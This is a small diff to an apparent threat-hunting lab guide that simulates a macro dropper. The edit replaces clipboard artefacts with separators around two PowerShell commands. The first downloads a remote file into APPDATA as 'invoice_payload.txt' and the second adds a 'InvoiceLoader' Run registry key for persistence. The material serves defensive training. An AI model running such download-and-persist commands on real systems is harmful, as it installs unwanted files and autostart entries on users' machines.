@@ -6,15 +6,12 @@ Simulation Steps:
 
 Create the “macro payload” simulation:
 
-powershell
-Copy
-Edit
+********
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/natespencer28/Threat-Hunts/refs/heads/main/Macro%20Dropper%20Hunt/Macro%20Dropper%20Creation" -OutFile "$env:APPDATA\invoice_payload.txt"
+********
+
 Mimic persistence by creating a fake registry run key:
 
-powershell
-Copy
-Edit
 New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "InvoiceLoader" -Value "$env:APPDATA\invoice_payload.txt"
 Hunting Goal:
 
